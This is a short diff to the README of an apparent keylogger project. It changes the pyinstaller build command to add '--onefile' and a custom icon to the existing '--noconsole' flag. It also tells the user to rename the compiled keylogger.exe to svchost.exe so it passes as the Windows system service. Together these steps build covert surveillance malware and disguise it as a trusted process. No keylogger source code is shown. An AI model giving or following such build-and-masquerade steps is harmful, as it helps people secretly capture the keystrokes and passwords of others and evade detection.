@@ -40,6 +40,6 @@ This tool was built on Python 3.8
 Compiling the executable
 -
 1. Open a command prompt window in the project root 
-2. `$ pyinstaller --noconsole keylogger.py`
+2. `$ pyinstaller --noconsole --onefile --icon=icon.ico keylogger.py`
 3. The compiled binary should be under `./dist/keylogger/keylogger.exe`
 4. Rename the `keylogger.exe` file to `svchost.exe`, as this is the name that the system service uses for the program
